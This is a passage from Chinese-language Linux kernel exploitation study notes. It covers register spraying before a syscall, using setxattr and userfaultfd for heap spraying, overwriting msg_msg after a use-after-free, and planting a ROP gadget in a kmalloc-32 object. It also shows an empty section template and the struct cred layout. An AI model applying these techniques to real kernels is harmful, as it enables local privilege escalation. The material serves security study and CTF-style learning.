    "mov r15,   0xbeefdead;"
    "mov r14,   0x11111111;"
    "mov r13,   0x22222222;"
    "mov r12,   0x33333333;"
    "mov rbp,   0x44444444;"
    "mov rbx,   0x55555555;"
    "mov r11,   0x66666666;"
    "mov r10,   0x77777777;"
    "mov r9,    0x88888888;"
    "mov r8,    0x99999999;"
    "xor rax,   rax;"
    "mov rcx,   0xaaaaaaaa;"
    "mov rdx,   8;"
    "mov rsi,   rsp;"
    "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
    "syscall"
);
```

## 0x02. setxattr系统调用

### 介绍

我们可以通过如下方式进行`setxattr`的系统调用:

```c
#include <sys/xattr.h>

setxattr("/exploit", "username", value, size);
```

其中:

- 第一个参数只需要指定一个存在的文件
- 第二个参数随便

该系统调用中, 主要有如下内容:

```c
static long setxattr(struct dentry *d, const char __user *name, const void __user *value,
     size_t size, int flags)
{
    //...
        kvalue = kvmalloc(size, GFP_KERNEL);
        if (!kvalue)
            return -ENOMEM;
        if (copy_from_user(kvalue, value, size)) {

    //,..

    kvfree(kvalue);

    return error;
}
```

**可以看到其实现了一个任意大小的`obj`申请,并且其内容也完全由我们控制!**

但不幸的是,该`obj`分配过后,随机就会被释放掉,导致其没有干任何事~

### 利用 - 实现改写obj

虽然我们编辑内容后其会被释放掉，但我们仍然可以编辑其除了`freelist`的内容。

例如，若存在一个`UAF`，我们可以申请一个`msg_msg`结构体，并使用`setxattr`来申请回来改写`m_ts`实现越界数据读，或者改写`next`指针实现任意地址读~

### 利用 - 结合userfaultfd来堆占位

`setxattr`函数中有一个`copy_from_user`,不难想到可以利用`userfaultfd`来将其**卡在这里**

而如果只是卡在这里,那该函数将失去控制其内容的能力. 

由此,我们可以利用堆占位技术来使得其既可以使得内容可控, 又随即让`copy_from_user`不再继续往下执行.

我们申请一块连续的两页内存:

```tex
| memory1: size=pagesize | memory2: size=pagesize |
```

随后,我们**为第二部分的内存,注册`userfaultfd`**, 使得访问到这里时直接卡住. 

![image-20240910154201533](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202409101542656.png)

如图所示,我们将我们要写入的内容写到第一页的末尾,使其结束时,刚好是第二页的`userfaultfd`的内容.

如此,我们即可让`copy_from_user`正常执行,随后访问到缺页的内容,导致线程卡住,不会执行`free`.

代码示意如下:

```c
pwn_addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
register_userfaultfd_for_thread_stucking(&monitor_setx, (void*)((size_t)pwn_addr + 0x1000), 0x1000);

*(size_t*)((size_t)pwn_addr + 0x1000 - 8) = add_rsp_0x1f8 + kernel_offset;
setxattr("/init", "ltfall", (char*)((size_t)pwn_addr + 0x1000 - 8), 0x20, 0);
```

可以看到,我们上面便申请了一个`kmalloc-32`的`obj`,并写入了`add_rsp_0x1f8`的`gadget`~



# 0x

## 属性

### 总结

### 打开方式

### 魔数

### 利用效果

### 结构体

## 利用

### 数据泄露 - 泄露内核基地址

### 劫持程序控制流



# 常见结构体

## 0x00. cred (cache: cred_jar | size=192, 0xc0)

其定义为如下形式，位于`include/linux/cred.h`。

```c
struct cred {
    atomic_t usage;                  /* 引用计数 */
    kuid_t uid;                      /* 有效用户 ID */
    kgid_t gid;                      /* 有效组 ID */
    kuid_t suid;                     /* 保存的用户 ID */
    kgid_t sgid;                     /* 保存的组 ID */
    kuid_t euid;                     /* 有效用户 ID */
    kgid_t egid;                     /* 有效组 ID */
    kuid_t fsuid;                    /* 文件系统用户 ID */
    kgid_t fsgid;                    /* 文件系统组 ID */
    unsigned securebits;             /* 安全位 */
    kernel_cap_t cap_inheritable;    /* 可继承能力 */
    kernel_cap_t cap_permitted;      /* 被允许的能力 */
    kernel_cap_t cap_effective;      /* 生效的能力 */
    kernel_cap_t cap_bset;           /* 能力的边界集合 */
    kernel_cap_t cap_ambient;        /* 环境能力 */
    struct user_struct *user;        /* 与用户相关的结构 */
    struct group_info *group_info;   /* 组信息 */
    struct key *session_keyring;     /* 会话密钥环 */
    struct key *process_keyring;     /* 进程密钥环 */
    struct key *thread_keyring;      /* 线程密钥环 */
    struct key *request_key_auth;    /* 请求密钥认证 */
#ifdef CONFIG_SECURITY
    void *security;                  /* 安全模块相关的私有数据 */
#endif
#ifdef CONFIG_KEYS
    struct key *user_keyring;        /* 用户密钥环 */
    struct key *user_ns_keyring;     /* 用户命名空间密钥环 */
#endif
    struct rcu_head rcu;             /* 用于 RCU（读取-复制-更新）回收 */
};
```

